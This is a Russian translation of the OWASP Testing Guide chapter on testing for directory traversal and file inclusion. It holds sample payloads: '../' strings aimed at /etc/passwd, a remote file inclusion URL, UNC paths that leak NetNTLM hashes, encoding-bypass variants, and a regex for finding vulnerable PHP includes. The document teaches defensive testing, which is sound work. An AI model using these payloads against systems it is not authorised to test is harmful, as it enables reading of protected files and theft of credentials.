# Обход каталогов и включение файлов

| ID |
| --- |
| WSTG-ATHZ-01 |

## Резюме

Многие веб-приложения используют файлы и управляют ими в рамках повседневного функционирования. При использовании некачественно спроектированных или некорректно внедренных методов валидации входных данных злоумышленник может поэксплуатировать систему для чтения или записи файлов, к которым не предполагался доступ. В определенных ситуациях может стать возможным выполнение произвольного кода или системных команд.

Традиционно веб-серверы и веб-приложения реализуют механизмы аутентификации для контроля доступа к файлам и ресурсам. Веб-серверы стремятся изолировать пользовательские файлы внутри «корневой директории» (root directory) или «корневой папки веб-документов» (web document root), представляющей собой физический каталог в файловой системе. Пользователи должны воспринимать эту директорию как базовый каталог в иерархической структуре веб-приложения.

Определение привилегий осуществляется с использованием списков контроля доступа (Access Control Lists, ACL), определяющих, каким пользователям или группам разрешено обращаться к конкретному файлу на сервере, изменять или исполнять его. Эти механизмы предназначены для предотвращения несанкционированного доступа злоумышленников к конфиденциальным файлам (например, стандартному файлу `/etc/passwd` на UNIX-подобных платформах) или для предотвращения выполнения системных команд.

Многие веб-приложения используют серверные скрипты для подключения различных типов файлов. Этот метод широко распространен для работы с изображениями, шаблонами, загрузки статических текстов и других задач. К сожалению, подобные приложения подвержены уязвимостям безопасности, если входные параметры (например, параметры форм, значения cookie) валидируются некорректно.

В веб-серверах и веб-приложениях проблемы подобного рода проявляются в атаках обхода каталога / внедрения файлов (Path Traversal / File Include). Эксплуатируя такие уязвимости, злоумышленник получает возможность читать директории или файлы, к которым в штатном режиме доступ закрыт, обращаться к данным за пределами корневого веб-каталога или подключать скрипты и файлы других типов с внешних сайтов.

В рамках руководства OWASP Testing Guide рассматриваются только угрозы безопасности, относящиеся к веб-приложениям, а не угрозы веб-серверов (такие как печально известный escape-код `%5c` в веб-сервере Microsoft IIS). Рекомендации по дополнительной литературе для заинтересованных читателей приведены в разделе ссылок.

Атаки данного типа также известны как атаки типа «точка-точка-слэш» (dot-dot-slash, `../`), обход каталога (Directory Traversal), подъем по дереву каталогов (directory climbing) или возврат по пути (backtracking).

В ходе аудита для выявления дефектов обхода пути и внедрения файлов тестировщикам необходимо выполнить два этапа:

1. Перечисление векторов ввода (систематический анализ каждого вектора ввода)
2. Методы тестирования (методическая оценка каждой техники атаки, используемой злоумышленником для эксплуатации уязвимости)

## Цели тестирования

- Идентифицировать точки внедрения, относящиеся к обходу пути.
- Оценить техники обхода фильтрации и определить масштаб возможного обхода пути.

## Методика тестирования

### Тестирование методом «черного ящика»

#### Перечисление векторов ввода

Чтобы определить, какие компоненты приложения уязвимы к обходу валидации входных данных, тестировщику необходимо перечислить все элементы приложения, принимающие данные от пользователя. Сюда также относятся HTTP-запросы GET и POST, а также типовые механизмы, такие как загрузка файлов и HTML-формы.

Ниже приведены примеры проверок, выполняемых на данном этапе:

- Присутствуют ли параметры запроса, которые могут использоваться для файловых операций?
- Присутствуют ли необычные расширения файлов?
- Имеются ли характерные имена переменных?
    - `https://example.com/getUserProfile.jsp?item=ikki.html`
    - `https://example.com/index.php?file=content`
    - `https://example.com/main.cgi?home=index.htm`
- Можно ли выявить cookie, используемые веб-приложением для динамической генерации страниц или шаблонов?
    - `Cookie: ID=d9ccd3f4f9f18cc1:TM=2166255468:LM=1162655568:S=3cFpqbJgMSSPKVMV:TEMPLATE=flower`
    - `Cookie: USER=1826cc8f:PSTYLE=GreenDotRed`

#### Техники тестирования

Следующий этап тестирования — анализ функций валидации входных данных, реализованных в веб-приложении. Возвращаясь к предыдущему примеру, динамическая страница `getUserProfile.jsp` загружает статическую информацию из файла и отображает ее содержимое пользователям. Злоумышленник может передать вредоносную строку `../../../../etc/passwd`, чтобы подключить файл с хешами паролей в системе Linux/UNIX. Очевидно, что атака такого типа успешна только в том случае, если проверка входных данных завершилась неудачей; при этом, согласно правам файловой системы, само веб-приложение должно обладать правами на чтение этого файла.

> Примечание: Для успешного тестирования этой уязвимости тестировщик должен обладать знаниями о тестируемой системе и расположении запрашиваемых файлов. Бессмысленно запрашивать `/etc/passwd` у веб-сервера IIS.

```text
https://example.com/getUserProfile.jsp?item=../../../../etc/passwd
```

Другой распространенный пример — подключение контента из внешнего источника (Remote File Inclusion, RFI):

```text
https://example.com/index.php?file=https://www.owasp.org/malicioustxt
```

Аналогичный подход применим к cookie или любым другим векторам ввода, используемым для динамической генерации страниц.

Дополнительные пейлоады для внедрения файлов можно найти в репозитории [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).

Важно учитывать, что в различных операционных системах используются разные разделители путей:

- UNIX-подобные ОС:
    - корневая директория: `/`
    - разделитель директорий: `/`
- Windows:
    - корневая директория: `<drive letter>:`
    - разделитель директорий: `\` или `/`
- Classic macOS:
    - корневая директория: `<drive letter>:`
    - разделитель директорий: `:`

Распространенная ошибка разработчиков заключается в том, что они не учитывают все возможные формы кодирования и выполняют валидацию только для базового URL-кодирования. Если тестовая строка не сработала сразу, попробуйте другую схему кодирования.

Методы кодирования и готовые к использованию пейлоады для обхода каталога представлены в репозитории [PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal).

#### Особенности, характерные для Windows

- Командная оболочка Windows (Windows shell): Добавление любого из следующих символов к путям, используемым в командах оболочки, не влияет на их функциональность:
    - Угловые скобки `<` и `>` в конце пути
    - Двойные кавычки (корректно закрытые) в конце пути
    - Избыточные маркеры текущей директории, такие как `./` или `.\\`
    - Избыточные маркеры родительской директории с произвольными элементами, которые могут существовать или не существовать:
        - `file.txt`
        - `file.txt...`
        - `file.txt<spaces>`
        - `file.txt""""`
        - `file.txt<<<>>><`
        - `./././file.txt`
        - `nonexistent/../file.txt`
- Windows API: Следующие элементы отбрасываются при использовании в любых командах оболочки или вызовах API, принимающих строку в качестве имени файла:
    - точки
    - пробелы
- UNC-пути файлов Windows (Windows UNC Filepaths): Используются для обращения к файлам на общих ресурсах SMB. Иногда приложение можно заставить обратиться к файлам по удаленному UNC-пути. В этом случае SMB-сервер Windows может отправить сохраненные учетные данные злоумышленнику (NetNTLM-хеши), которые можно перехватить и взломать. Они также могут использоваться с адресом обратной петли (loopback) или доменным именем для обхода фильтров либо для доступа к файлам на SMB-ресурсах, недоступных злоумышленнику напрямую, но доступных веб-серверу.
    - `\\server_or_ip\path\to\file.abc`
    - `\\?\server_or_ip\path\to\file.abc`
- Пространство имен устройств Windows NT (Windows NT Device Namespace): Используется для обращения к пространству имен устройств Windows. Определенные ссылки позволяют получить доступ к файловым системам по альтернативному пути:
    - Может быть эквивалентно букве диска, такой как `c:\`, или даже тому диска без назначенной буквы: `\\.\GLOBALROOT\Device\HarddiskVolume1\`
    - Ссылка на первый привод оптических дисков в системе: `\\.\CdRom0\`

### Тестирование методом «белого ящика»

При проведении анализа методом «белого ящика» (White-Box Testing) тестировщики следуют той же методологии, что и при тестировании методом «черного ящика». Однако благодаря возможности анализа исходного кода поиск векторов ввода осуществляется значительно проще и точнее. В ходе аудита исходного кода можно использовать простые утилиты (например, команду *grep*) для поиска типовых паттернов в коде приложения: функций/методов подключения файлов, операций с файловой системой и т. д.

- `PHP: include(), include_once(), require(), require_once(), fopen(), readfile(), ...`
- `JSP/Servlet: java.io.File(), java.io.FileReader(), ...`
- `ASP: include file, include virtual, ...`
 
Используя онлайн-поисковики по исходному коду (например, [Searchcode](https://searchcode.com/)), также можно находить дефекты обхода пути в программном обеспечении с открытым исходным кодом, опубликованном в сети Интернет.

Для PHP тестировщики могут использовать следующее регулярное выражение:

```text
(include|require)(_once)?\s*['"(]?\s*\$_(GET|POST|COOKIE)
```

Использование метода «белого ящика» позволяет выявлять уязвимости, которые обычно трудно обнаружить или вовсе невозможно выявить в процессе стандартного аудита методом «черного ящика».

Некоторые веб-приложения генерируют динамические страницы с использованием значений и параметров, хранящихся в базе данных. Специально сформированные строки для обхода пути могут быть внедрены на этапе добавления данных приложением в базу данных. Подобные проблемы безопасности сложно выявить ввиду того, что параметры внутри функций подключения выглядят внутренними и **безопасными**, однако в действительности таковыми не являются.

Кроме того, при анализе исходного кода можно изучить функции, предназначенные для обработки некорректных входных данных: некоторые разработчики пытаются модифицировать невалидный ввод, чтобы сделать его валидным во избежание предупреждений и ошибок. Такие функции зачастую содержат бреши в безопасности.

Рассмотрим веб-приложение со следующими инструкциями:

```php
filename = Request.QueryString("file");
Replace(filename, "/","\");
Replace(filename, "..\","");
```

Тестирование на наличие дефекта осуществляется передачей следующих значений:

```text
file=....//....//boot.ini
file=....\\....\\boot.ini
file= ..\..\boot.ini
```
